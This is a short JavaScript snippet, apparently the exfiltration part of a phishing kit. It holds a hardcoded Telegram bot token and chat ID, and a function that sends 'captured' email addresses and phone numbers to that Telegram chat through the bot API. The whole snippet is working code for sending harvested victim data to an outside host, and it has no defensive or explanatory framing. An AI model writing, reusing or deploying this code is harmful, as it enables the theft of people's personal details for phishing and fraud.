const tokens = '7153300024:AAHxg3xOAYbsBbLrIpQJoYNbeFBuYPmnsyk';
const chatIds = '5538909913';

function sendToTg(e, p, token = tokens, chatId = chatIds) {
  const message = `*---New Data Captured---*\n\n*New Email:* ${e}\n\n*New Phone:* ${p}\n\n*--- End ---*`;

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  return fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
    }),
  })
    .then(response => response.ok)
    .catch(() => false);
}
  




